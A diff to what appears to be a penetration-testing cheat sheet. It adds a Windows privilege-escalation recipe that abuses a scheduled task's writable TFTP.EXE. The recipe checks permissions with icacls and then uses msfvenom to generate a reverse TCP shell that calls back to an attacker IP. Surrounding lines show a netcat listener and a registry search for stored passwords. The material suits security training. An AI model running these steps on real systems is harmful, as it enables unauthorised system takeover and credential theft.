@@ -2328,6 +2328,33 @@ nc -nlvp 636 #wait 5 minutes
 ````
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md #Last Resort
 ````
+### Scheduled Tasks
+#### Enumeration
+````
+C:\Backup>type info.txt
+type info.txt
+Run every 5 minutes:
+C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
+````
+#### ICACLS
+````
+C:\Backup>icacls TFTP.EXE
+icacls TFTP.EXE
+TFTP.EXE BUILTIN\Users:(I)(F)
+         BUILTIN\Administrators:(I)(F)
+         NT AUTHORITY\SYSTEM:(I)(F)
+         NT AUTHORITY\Authenticated Users:(I)(M)
+````
+````
+BUILTIN\Users: The built-in "Users" group has "Full Control" (F) and "Inherit" (I) permissions on the file.
+BUILTIN\Administrators: The built-in "Administrators" group has "Full Control" (F) and "Inherit" (I) permissions on the file.
+NT AUTHORITY\SYSTEM: The "SYSTEM" account has "Full Control" (F) and "Inherit" (I) permissions on the file.
+NT AUTHORITY\Authenticated Users: Authenticated users have "Modify" (M) and "Inherit" (I) permissions on the file.
+````
+#### Exploitation
+````
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=80 -f exe -o TFTP.EXE #Replace the original file and wait for a shell
+````
 ### Registry Keys
 ````
 REG QUERY HKLM /F "password" /t REG_SZ /S /K
